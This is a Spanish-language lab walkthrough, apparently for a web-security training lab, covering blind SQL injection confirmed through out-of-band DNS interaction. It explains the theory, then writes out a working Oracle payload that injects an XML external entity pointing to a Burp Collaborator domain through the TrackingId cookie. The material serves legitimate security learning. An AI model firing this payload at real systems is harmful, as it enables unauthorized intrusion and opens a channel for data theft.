# 💉 Inyección SQL ciega con interacción out-of-band (OOB)

## 📄 Descripción del laboratorio

Este laboratorio contiene una **inyección SQL ciega con ejecución asíncrona**.\
La aplicación utiliza una cookie llamada `TrackingId` para realizar análisis internos, y su valor se inserta directamente en una consulta SQL.

En este escenario:

* Los resultados de la consulta **no se devuelven en la respuesta**.
* La respuesta HTTP **no cambia en ningún caso**.
* **No se muestran errores SQL**.
* **No existen diferencias de tiempo medibles**.

Sin embargo, el backend sí puede generar **interacciones fuera de banda (Out-of-Band, OOB)** con dominios externos.

El objetivo es provocar una **consulta DNS detectable mediante Burp Collaborator**, demostrando que el código SQL inyectado se ejecuta en el servidor.



## 📚 Teoría

### 📌 Blind SQL Injection con interacción Out-of-Band

Este laboratorio representa uno de los escenarios más restrictivos de **Blind SQL Injection**.

No existe ninguno de los canales clásicos de retroalimentación:

* No hay datos reflejados.
* No hay mensajes de error.
* No hay diferencias en la respuesta HTTP.
* No hay retrasos temporales.

Esto ocurre porque la consulta SQL vulnerable se ejecuta de forma **asíncrona**.\
La aplicación envía la respuesta al usuario antes de que la consulta SQL termine de ejecutarse.

Por lo tanto, el resultado de la consulta no afecta a la respuesta HTTP.

La única forma de confirmar la ejecución del código SQL es mediante **interacciones externas**.

### 📌 Técnicas Out-of-Band

Las técnicas **Out-of-Band (OOB)** consisten en provocar que el servidor vulnerable interactúe con un recurso externo controlado por el atacante.

Esto puede implicar:

* Resoluciones DNS
* Peticiones HTTP
* Conexiones a servicios remotos

Si el atacante controla ese recurso externo, puede detectar la interacción y confirmar que la inyección se ejecutó.

### 📌 Uso de entidades externas XML en Oracle

En bases de datos **Oracle**, es posible provocar solicitudes externas utilizando funciones de procesamiento XML como:

```
XMLTYPE
EXTRACTVALUE
```

Estas funciones permiten procesar documentos XML que incluyen **entidades externas**.

Una entidad externa puede apuntar a un dominio remoto.\
Cuando Oracle intenta resolver esa entidad, se produce una **consulta DNS o HTTP** hacia el dominio especificado.

Si ese dominio pertenece a **Burp Collaborator**, podremos detectar la interacción.



## 📝 Práctica

### 1️⃣ Preparar Burp Collaborator

Abrimos **Burp Collaborator** y generamos un subdominio único, por ejemplo:

```
abcdef1234.oastify.com
```

Este dominio se utilizará para detectar la interacción fuera de banda.



### 2️⃣ Localizar el punto vulnerable

Sabemos que la cookie vulnerable es:

```
TrackingId
```

Interceptamos una petición HTTP que incluya esta cookie y la enviamos a **Burp Repeater**.

Podemos probar payloads simples, como introducir comillas o comentarios SQL, pero no veremos ningún efecto visible.

Esto es esperado en este tipo de laboratorio.



### 3️⃣ Construir el payload OOB

Utilizamos una combinación de **SQL Injection + entidad externa XML** para provocar una resolución DNS.

Payload base:

```
' UNION SELECT EXTRACTVALUE(
  xmltype('<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://abcdef1234.oastify.com/">
    %remote;
  ]>'),
'/l')
FROM dual-- -
```

Funcionamiento del payload:

1. Se inyecta una consulta `UNION SELECT`.
2. Se crea un documento XML con una entidad externa.
3. La entidad apunta al dominio de Burp Collaborator.
4. Al procesar el XML, la base de datos intenta resolver ese dominio.

Esto provoca una interacción externa detectable.

Antes de enviarlo, el payload debe **URL-encodearse completamente** para evitar errores de parsing.



### 4️⃣ Enviar el payload

Insertamos el payload codificado en la cookie `TrackingId`.

Ejemplo conceptual:

```
TrackingId=abc' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://abcdef1234.oastify.com/"> %remote;]>'),'/l') FROM dual-- -
```

Enviamos la petición desde **Burp Repeater**.

### 5️⃣ Confirmar la interacción fuera de banda

Volvemos a la pestaña **Burp Collaborator** y pulsamos **Poll now**.

Aparece una interacción similar a:

```
Type: DNS
Domain: abcdef1234.oastify.com
```

Esto confirma que:

* La consulta SQL se ejecutó en el backend.
* El documento XML fue procesado.
* El servidor intentó resolver el dominio externo.

La interacción DNS confirma la existencia de la vulnerabilidad.

### 6️⃣ Resultado

Mediante una técnica de **SQL Injection ciega con interacción Out-of-Band** se ha conseguido:

* Confirmar la vulnerabilidad en la cookie `TrackingId`.
* Forzar una resolución DNS desde el servidor vulnerable.
* Detectar la interacción mediante **Burp Collaborator**.
* Demostrar que el código SQL inyectado se ejecuta en el backend.

✅ El laboratorio se marca como completado tras detectar la interacción DNS.
